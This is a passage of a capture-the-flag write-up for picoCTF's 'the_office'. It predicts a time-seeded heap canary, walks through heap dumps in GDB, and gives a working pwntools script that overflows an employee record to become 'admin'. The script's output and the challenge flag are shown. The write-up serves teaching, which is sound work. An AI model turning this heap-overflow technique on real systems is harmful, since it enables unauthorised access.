    <span class=mtk1>DAT_0804c074</span> <span class=mtk5>=</span> <span class=mtk8>mmap</span><span class=mtk1>((</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>1000</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>22</span><span class=mtk1>,</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>((DAT_0804c074</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>ffffffff</span><span class=mtk1>)</span> <span class=mtk5>||</span> <span class=mtk1>(DAT_0804c074</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Memory</span> <span class=mtk4>Error</span> <span class=mtk4>:("</span><span class=mtk1>);</span>
      <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
      <span class=mtk1>__seed</span> <span class=mtk5>=</span> <span class=mtk8>time</span><span class=mtk1>((</span><span class="mtk7 mtki">time_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
      <span class=mtk8>srand</span><span class=mtk1>(__seed);</span>
      <span class=mtk1>DAT_0804c06c</span> <span class=mtk5>=</span> <span class=mtk8>rand</span><span class=mtk1>();</span>
      <span class=mtk1>DAT_0804c078</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">int</span><span class=mtk1>)</span> <span class=mtk1>DAT_0804c074</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>1000</span><span class=mtk1>;</span>
      <span class=mtk1>DAT_0804c070</span> <span class=mtk5>=</span> <span class=mtk1>DAT_0804c074;</span>
      <span class=mtk8>FUN_080491f0</span><span class=mtk1>(DAT_0804c074,</span> <span class=mtk5>0x</span><span class=mtk6>1000</span> <span class=mtk5>-</span> <span class=mtk1>DAT_0804c060,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>);</span>
      <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk1>}</span>
  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk6>1</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk5>return</span> <span class=mtk1>uVar1;</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>It is using <code>srand</code> to set a time-based seed and <code>rand</code> to generate the canary using a Pseudo Random Number Generator (PRNG). This is really similar to <a href=../seed-spring>seed-sPRiNG</a>.</p>
<p>We can use a simple C code to generate a random number using the same method above:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;time.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
  <span class="mtk7 mtki">time_t</span> <span class=mtk1>t</span> <span class=mtk5>=</span> <span class=mtk8>time</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>

  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>t</span> <span class=mtk5>+=</span> <span class=mtk8>atoi</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>]);</span>
  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>

  <span class=mtk8>srand</span><span class=mtk1>(t);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk8>rand</span><span class=mtk1>());</span>

  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>We can compile the code and use it like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gcc</span> -o canary canary.c  

<span class=code-cyan>$</span> <span class=code-dark-green>./canary</span> 0
1073673904

<span class=code-cyan>$</span> <span class=code-dark-green>./canary</span> 1
156048449
</code></pre></div>
<p>The number passed as argument is just an offset in case the remote instance is not synchronized with our local machine.</p>
<p>Let&rsquo;s create another user using GDB and visualize the strategy:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: CCCC
Email (y/n)? n
Salary: 127
Phone #: DDDD
Bldg (y/n)? n

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/40x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x1a3e675e      0x00000035      0x00000001      0x41414141  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x000000ff      0x42424242      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x1a3e675e      0x00000035      0x00000035      0x43434343
<span class=code-dark-blue>0xf7ffb050</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x0000007f      0x44444444      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x1a3e675e      0x00000f74      0x00000035      0x00000000
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>If we remove the first employee, we see that its data is not erased:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
2

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
Employee #?
0

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/40x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x1a3e675e      0x00000034      0x00000001      0x41414141  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x000000ff      0x42424242      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x1a3e675e      0x00000035      0x00000034      0x43434343
<span class=code-dark-blue>0xf7ffb050</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x0000007f      0x44444444      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x1a3e675e      0x00000f74      0x00000035      0x00000000
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>The only difference with the previous heap status is that there are some <code>0x34</code> instead of <code>0x35</code> (which means that the chunk is no more used, not allocated). This functionality tries to mimic <code>free</code>, because if we create another employee, we overwrite this released chunk:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: EEEE
Email (y/n)? n
Salary: 65535
Phone #: FFFF
Bldg (y/n)? n

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/40x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x1a3e675e      0x00000035      0x00000001      0x45454545  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x0000ffff      0x46464646      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x1a3e675e      0x00000035      0x00000035      0x43434343
<span class=code-dark-blue>0xf7ffb050</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x0000007f      0x44444444      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x1a3e675e      0x00000f74      0x00000035      0x00000000
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>At this point, we could have exploited the Buffer Overflow vulnerability (overwriting the canary with the same value) and modify the second employee&rsquo;s username.</p>
<p>In order to automate it, we can use this Python exploit using <code>pwntools</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p32,</span> <span class="mtk8 mtku">process</span><span class=mtk1>,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'the_office'</span>
<span class=mtk1>elf</span> <span class=mtk5>=</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk1>elf</span><span class=mtk1>.process()</span>

    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>compute_canary</span><span class=mtk1>(</span><span class="mtk9 mtki">offset</span><span class=mtk1>):</span>
    <span class=mtk5>with</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk8>local</span><span class=mtk1>(</span><span class="mtk9 mtki">log_level</span><span class=mtk5>=</span><span class=mtk4>'CRITICAL'</span><span class=mtk1>):</span>
        <span class=mtk1>canary_process</span> <span class=mtk5>=</span> <span class="mtk8 mtku">process</span><span class=mtk1>([</span><span class=mtk4>'canary'</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>(</span><span class="mtk9 mtki">offset</span><span class=mtk1>)])</span>
        <span class=mtk1>canary</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>canary_process</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>decode</span><span class=mtk1>())</span>
        <span class=mtk1>canary_process</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>

    <span class=mtk5>return</span> <span class=mtk1>canary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class="mtk9 mtki">p</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'a'</span><span class=mtk1>,</span> <span class="mtk9 mtki">salary</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'b'</span><span class=mtk1>):</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Name:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Email</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'n'</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Salary:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">salary</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Phone</span> <span class=mtk4>#:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Bldg</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'n'</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>0</span>

    <span class=mtk5>while</span> <span class=mtk6>True</span><span class=mtk1>:</span>
        <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Testing</span> <span class=mtk4>offset:</span> <span class=mtk6>{</span><span class=mtk1>offset</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

        <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

        <span class=mtk1>canary</span> <span class=mtk5>=</span> <span class=mtk8>compute_canary</span><span class=mtk1>(</span><span class=mtk1>offset</span><span class=mtk1>)</span>
        <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Computed</span> <span class=mtk4>heap</span> <span class=mtk4>canary:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>canary</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

        <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>)</span>
        <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>)</span>

        <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
        <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Employee</span> <span class=mtk4>#?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'0'</span><span class=mtk1>)</span>

        <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk6>28</span> <span class=mtk5>+</span> <span class=mtk1>p32(</span><span class=mtk1>canary</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>35</span><span class=mtk1>)</span> <span class=mtk5>*</span> <span class=mtk6>2</span> <span class=mtk5>+</span> <span class="mtk7 mtki">b</span><span class=mtk4>'admin'</span><span class=mtk1>)</span>  

        <span class=mtk5>try</span><span class=mtk1>:</span>
            <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'4'</span><span class=mtk1>)</span>
        <span class=mtk5>except</span> <span class="mtk8 mtku">EOFError</span><span class=mtk1>:</span>
            <span class=mtk1>offset</span> <span class=mtk5>+=</span> <span class=mtk6>1</span>
            <span class=mtk5>continue</span>

        <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Employee</span> <span class=mtk4>#?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
        <span class=mtk5>break</span>

    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Flag:</span> <span class=mtk6>{</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>decode</span><span class=mtk1>()</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<p>Notice that the malicious payload consists of 28 characters to reach the canary, then the random value of the canary (generated using the previous C code), then two <code>0x00000035</code> to keep the chunk metadata, and after that we put <code>admin</code> as username for the second employee. Once there, we can just get the access token (the flag).</p>
<p>Let&rsquo;s run it locally:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> THISISTHEFLAG > flag.txt

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-blue>*</span>] './the_office'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-blue>*</span>] Testing offset: 0
[<span class=code-green>+</span>] Starting local process './the_office': pid 2018360
[<span class=code-blue>*</span>] Computed heap canary: 0x25399862
[<span class=code-green>+</span>] Flag: THISISTHEFLAG
[<span class=code-blue>*</span>] Process './the_office' stopped with exit code 0 (pid 2018360)  
</code></pre></div>
<p>Now we can try it on the remote instance and get the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py mercury.picoctf.net 24751
[<span class=code-blue>*</span>] './the_office'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-blue>*</span>] Testing offset: 0
[<span class=code-green>+</span>] Opening connection to mercury.picoctf.net on port 24751: Done  
[<span class=code-blue>*</span>] Computed heap canary: 0xd83ff5c
[<span class=code-blue>*</span>] Testing offset: 1
[<span class=code-green>+</span>] Opening connection to mercury.picoctf.net on port 24751: Done
[<span class=code-blue>*</span>] Computed heap canary: 0x4db603e
[<span class=code-green>+</span>] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31}
[<span class=code-blue>*</span>] Closed connection to mercury.picoctf.net port 24751
[<span class=code-blue>*</span>] Closed connection to mercury.picoctf.net port 2475
</code></pre></div>
<p>Alright, we have the flag. But now, let&rsquo;s solve the challenge in another way: leaking the canary.</p>
<p>We saw before that we can add employees indicating an email and a building (<code>Bldg</code>) if it applies. Let&rsquo;s restart GDB and add four users (all combinations).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q the_office
Reading symbols from <span class=code-dark-green>the_office</span>...
(No debugging symbols found in <span class=code-dark-green>the_office</span>)  
<span class=code-red>gef➤</span>  run
Starting program: ./the_office
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: AAAA
Email (y/n)? n
Salary: 15
Phone #: BBBB
Bldg (y/n)? n

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: CCCC
Email (y/n)? n
Salary: 127
Phone #: DDDD
Bldg (y/n)? y
Bldg #: 1

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: EEEE
Email (y/n)? y
Email address: aaaa
Salary: 255
Phone #: FFFF
Bldg (y/n)? n

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: GGGG
Email (y/n)? y
Email address: bbbb
Salary: 65535
Phone #: HHHH
Bldg (y/n)? y
Bldg #: 2

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
^C
Program received signal SIGINT, Interrupt.
<span class=code-dark-blue>0xf7fcf549</span> in <span class=code-dark-yellow>__kernel_vsyscall</span> ()
</code></pre></div>
<p>Now we can check the heap:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  grep AAAA
<span class=code-blue>[+]</span> Searching '<span class=code-dark-yellow>AAAA</span>' in memory
<span class=code-green>[+]</span> In (0xf7ffb000-0xf7ffc000), permission=rw-
  0xf7ffb00c - 0xf7ffb010  →   "<span class=code-dark-magenta>AAAA</span>"
<span class=code-green>gef➤</span>  x/100x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x1c180451      0x00000035      0x00000001      0x41414141  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x0000000f      0x42424242      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x1c180451      0x00000035      0x00000035      0x43434343
<span class=code-dark-blue>0xf7ffb050</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x0000007f      0x44444444      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x00000001      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x1c180451      0x00000035      0x00000035      0x45454545
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0xf7ffb0cc
<span class=code-dark-blue>0xf7ffb0a0</span>:     0x000000ff      0x46464646      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb0b0</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb0c0</span>:     0x1c180451      0x00000015      0x00000035      0x61616161
<span class=code-dark-blue>0xf7ffb0d0</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb0e0</span>:     0x1c180451      0x00000035      0x00000015      0x47474747
<span class=code-dark-blue>0xf7ffb0f0</span>:     0x00000000      0x00000000      0x00000000      0xf7ffb12c
<span class=code-dark-blue>0xf7ffb100</span>:     0x0000ffff      0x48484848      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb110</span>:     0x00000002      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb120</span>:     0x1c180451      0x00000015      0x00000035      0x62626262
<span class=code-dark-blue>0xf7ffb130</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb140</span>:     0x1c180451      0x00000eb4      0x00000015      0x00000000
<span class=code-dark-blue>0xf7ffb150</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb160</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb170</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb180</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>Notice that the email is stored as a pointer to another chunk. If we increase the length of the email field, we are able to obtain a chunk that has the canary at the position where it would be placed the building number in an employee chunk (for instance, between 20 and 35 characters):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q the_office
Reading symbols from <span class=code-dark-green>the_office</span>...
(No debugging symbols found in <span class=code-dark-green>the_office</span>)  
<span class=code-red>gef➤</span>  run
Starting program: ./the_office
1) Exit
2) Add employee
3) Remove employee
4) List employees
5) Get access token
1
Name: AAAA
Email (y/n)? y
Email address: aaaaaaaaaaaaaaaaaaaaaaaa
Salary: 255
Phone #: BBBB
Bldg (y/n)? n

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
^C
Program received signal SIGINT, Interrupt.
<span class=code-dark-blue>0xf7fcf549</span> in <span class=code-dark-yellow>__kernel_vsyscall</span> ()
</code></pre></div>
<p>This is the heap:</p>
